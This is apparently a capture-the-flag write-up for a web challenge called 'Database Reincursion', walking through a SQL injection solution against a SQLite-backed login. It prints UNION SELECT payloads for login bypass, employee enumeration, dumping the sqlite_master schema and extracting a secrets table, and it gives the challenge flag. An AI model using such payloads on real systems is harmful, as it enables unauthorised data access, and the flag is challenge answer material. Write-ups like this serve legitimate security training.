# Database Reincursion

## Webex

### Solution

Union Select SQLI similar to the one in citadel

```
-' UNION SELECT 1,2, 3
```
This logged me in as it forces a row to exist.  
Honestly this was the hardest part of the question because it took me so long to try union select because I'm kinda slow.  
For some reason the word 'password' was blocked by the filter which threw me off for a good 15 minutes while i tried to find some password table lmao.  

Next part required me to find Kiwi in the employee table.
Kiwi was not in the first 4 employees and there was a limit by 4 clause in the returning query.  
This was easily bypassed just by doing id>x until kiwi came up.
```
  ' UNION SELECT id,name,3,4,5 FROM employees WHERE id>4/*
```
This did give Kiwi but no password.  
Threw me off for about 5 minutes before I realised I should just check if theres more Kiwis and the one with ID 14 had it. 


Now we have a list of tables  
<img width="1908" height="396" alt="image" src="https://github.com/user-attachments/assets/4c57f87d-feb5-4413-a174-cbb580017e41" />

Obviously the one we want is the **Redacted** table.  

SqliteMaster has all table schema records.  
```
  ' UNION SELECT sql,1,1,1FROM sqlite_master/*
```

Used this to get:  
<img width="1910" height="481" alt="image" src="https://github.com/user-attachments/assets/46df3714-9107-49cc-8b69-8aa50d183adc" />

From here simply ran
```
' UNION SELECT secrets,1,1,1 FROM CITADEL_ARCHIVE_2077/*
```
and got the flag.

Flag: **nite{neVeR_9Onn4_57OP_WonDER1N9_1f_175_5ql_oR_5EKWeL}**
